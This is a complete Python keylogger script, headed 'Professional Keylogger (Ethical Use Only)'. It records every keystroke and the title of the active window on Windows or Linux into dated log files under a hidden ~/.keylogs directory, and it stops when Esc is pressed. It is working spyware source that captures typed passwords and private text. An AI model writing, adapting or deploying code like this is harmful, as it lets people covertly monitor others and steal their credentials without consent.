from pynput import keyboard
from pynput.keyboard import Key, Listener
from datetime import datetime
import logging
import os
import platform

try:
    import win32gui
except ImportError:
    win32gui = None

try:
    import subprocess
except ImportError:
    subprocess = None

# === Setup Log Directory and File ===
log_dir = os.path.expanduser("~/.keylogs")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, f"keylog_{datetime.now().date()}.log")

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s",
)

# === Track Last Window ===
last_window = None

def get_active_window():
    os_name = platform.system()

    if os_name == "Windows" and win32gui:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    elif os_name == "Linux":
        try:
            result = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            return result.stdout.decode('utf-8').strip()
        except Exception:
            return None
    else:
        return None

def on_press(key):
    global last_window
    current_window = get_active_window()

    # Detect window change
    if current_window and current_window != last_window:
        last_window = current_window
        logging.info(f"\n[Window Changed] {current_window}\n")

    try:
        # Alphanumeric keys
        if hasattr(key, 'char') and key.char is not None:
            logging.info(f"Key Pressed: {key.char}")
        else:
            # Special keys
            logging.info(f"Special Key: {key}")
    except Exception as e:
        logging.warning(f"[Error] {e}")

def on_release(key):
    # You can add logic here to stop recording on a special key
    if key == Key.esc:
        logging.info("Session ended.")
        return False

def banner():
    print(r"""
  ____  _             _                      
 |  _ \| | __ _ _   _| | ___  ___ ___  _ __  
 | |_) | |/ _` | | | | |/ _ \/ __/ _ \| '_ \ 
 |  __/| | (_| | |_| | |  __/ (_| (_) | | | |
 |_|   |_|\__,_|\__, |_|\___|\___\___/|_| |_|
                |___/                       
         Professional Keylogger (Ethical Use Only)
    """)

# === Run Keylogger ===
if __name__ == "__main__":
    banner()
    logging.info("=" * 50)
    logging.info(f"Session started at {datetime.now()}")
    logging.info("=" * 50)
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
